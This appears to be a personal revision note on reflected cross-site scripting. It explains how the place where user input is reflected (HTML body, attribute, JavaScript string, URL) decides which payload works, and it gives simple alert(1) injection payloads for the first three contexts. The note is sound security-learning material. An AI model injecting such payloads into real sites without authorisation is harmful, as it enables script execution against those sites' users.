# Reflected XSS Contexts

## Overview

Finding reflection is only the first step.

The most important question is:

```text
Where Does My Input Appear?
```

The answer determines:

```text
Payload Selection
Bypass Strategy
Exploitation Method
```

---

# Context 1 - HTML Context

Example:

```html
<p>USER_INPUT</p>
```

---

Payload:

```html
<script>alert(1)</script>
```

---

Result:

```javascript
alert(1)
```

executes.

---

# Context 2 - HTML Attribute Context

Example:

```html
<input value="USER_INPUT">
```

---

Payload:

```html
" onmouseover="alert(1)
```

---

Result:

```html
<input value=""
onmouseover="alert(1)">
```

---

# Context 3 - JavaScript Context

Example:

```javascript
var search =
"USER_INPUT";
```

---

Payload:

```javascript
";alert(1);//
```

---

Result:

```javascript
var search = "";
alert(1);
//";
```

---

# Context 4 - URL Context

Example:

```html
<a href="USER_INPUT">
```

---

Goal:

```text
Break Context
Execute JavaScript
```

---

# Why Context Matters

Payload:

```html
<script>alert(1)</script>
```

may work in:

```text
HTML Context
```

but fail in:

```text
Attribute Context
```

---

# Testing Flow

```text
Reflection Found
        ↓
Determine Context
        ↓
Select Payload
        ↓
Test Execution
```

---

# Personal Revision Note

Never ask:

```text
Is Input Reflected?
```

Only.

Also ask:

```text
Where Is Input Reflected?
```

---

# Related Theory

- 09-testing-for-reflected-xss.md

---

# Key Takeaways

- Context determines exploitability.
- Different contexts require different payloads.
- Reflection alone does not equal XSS.